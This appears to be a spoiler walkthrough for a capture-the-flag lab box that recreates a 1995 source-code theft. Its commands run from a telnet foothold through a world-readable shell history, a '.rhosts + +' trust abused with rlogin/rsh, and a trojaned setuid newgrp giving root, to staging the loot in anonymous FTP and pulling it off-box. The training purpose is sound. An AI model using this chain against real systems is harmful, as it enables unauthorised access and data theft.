# Walkthrough — Box 1 "gaia"  ⚠️ SPOILERS

> **STOP.** This file gives away the entire solution. If you want to *play* Box 1,
> read `docs/field-manual.md` instead and come back only to check yourself.
>
> Everything below the line is the intended path end-to-end.

---

The lesson of Box 1: in 1995, **trust relationships and setuid binaries owned
boxes**. No memory-corruption exploit is needed — just trusting a file you
shouldn't and a setuid bit nobody audited. The whole chain is:

```
telnet login (brian)  →  read pei's world-readable history  →
dono's .rhosts "+ +"  →  rlogin as dono (no password)  →
setuid newgrp -hack root  →  root  →  ftp the loot off-box
```

## 0. Recon

```sh
telnet 127.0.0.1 2323
```
The banner claims **SunOS 4.1.4** — ignore it (it's a costume; `uname -a` later
proves FreeBSD). Log in with the foothold contractor account:

```
login: brian
Password: newriver        # hinted by the handover note / breadcrumb
```

## 1. Foothold → breadcrumb

In `brian`'s home there's `handover.txt`: the departing admin **pei** set up the
account, warns *don't touch `/usr/src/sys`* (dono owns the Motorola migration),
and notes *"the r-tools are up."* Two leads: the user **pei**, and **dono** owning
something valuable.

pei left a world-readable shell history:
```sh
ls -la /home/pei
cat /home/pei/.bash_history
```
It spells out the rest: *"dono's box trusts us now, no more password prompts"*,
`rlogin gaia -l dono`, `su dono -c 'newgrp -hack root'`, then `newgrp -hack root`
→ `id` (root), and `ls -la /usr/src/sys/maniac`. That history is the map.

## 2. Abuse the r-services trust (dono's `.rhosts "+ +"`)

`dono`'s home contains `~/.rhosts` with `+ +` — *trust every user on every host*.
BSD `rlogind`/`rshd` honour it: anyone can become `dono` with **no password**.
The forwarded r-service port is high (5514) and r-clients want a privileged
source port, so the clean route is to pivot **from your shell on the box**:

```sh
# still logged in as brian, on the box:
rlogin localhost -l dono        # no password — the "+ +" trust lets you in
# or non-interactively:
rsh localhost -l dono id
```
You are now `dono`.

## 3. setuid trojan → root

The box has a trojaned, setuid-root `newgrp`. Given the magic argument it drops a
root shell (it's a genuine setuid-root binary — real escalation, not a sim):

```sh
ls -l /usr/bin/newgrp     # -rwsr-xr-x  root  wheel   (the setuid bit is the bug)
newgrp -hack root
id                        # uid=0(root)  → you're root
uname -a                  # FreeBSD ... gaia  — the banner lied; this is the truth
```

## 4. Find the loot

```sh
ls -la /usr/src/sys/maniac
cat /usr/src/sys/maniac/README
```
There's the planted "stolen" firewall source and the archive
**`maniac1.3.4.tar.gz`** — the objective, echoing the Feb 1995 Motorola MANIAC
theft (TIMELINE 4014/4017).

## 5. Exfiltrate — possession after transfer

The win condition is **possession of the tarball on a host you control**, proven
by transferring it off the box (no box-side "detection" required). The box runs an
anonymous FTP server; as root, stage the loot where anon FTP can read it, then
pull it from your attacker host:

```sh
# as root on the box:
cp /usr/src/sys/maniac/maniac1.3.4.tar.gz /var/ftp/pub/maniac1.3.4.tar.gz
chmod 644 /var/ftp/pub/maniac1.3.4.tar.gz
```
```sh
# on your attacker host:
ftp 127.0.0.1 2121
#   Name: anonymous     Password: anything@example.com
#   ftp> bin
#   ftp> cd pub
#   ftp> get maniac1.3.4.tar.gz
#   ftp> quit
tar xzf maniac1.3.4.tar.gz
cat maniac/flag.txt
```

## Flag

```
BU{REDACTED-flag-is-derived-see-build-flag-sh}
```

(Also recoverable directly from `/usr/src/sys/maniac/maniac1.3.4.tar.gz` once
root — but the intended objective is the off-box transfer, mirroring the case.)

## What each step taught

1. **Banners lie** — the SunOS greeting was theatre; behaviour and `uname` are truth.
2. **World-readable history leaks the kill chain** — operational hygiene matters.
3. **`.rhosts "+ +"` is remote root-by-trust** — r-services trust is a loaded gun.
4. **An unaudited setuid-root binary is game over** — the setuid bit *is* the exploit.
5. **Exfil = possession after transfer** — the objective mirrors the 1995 theft.
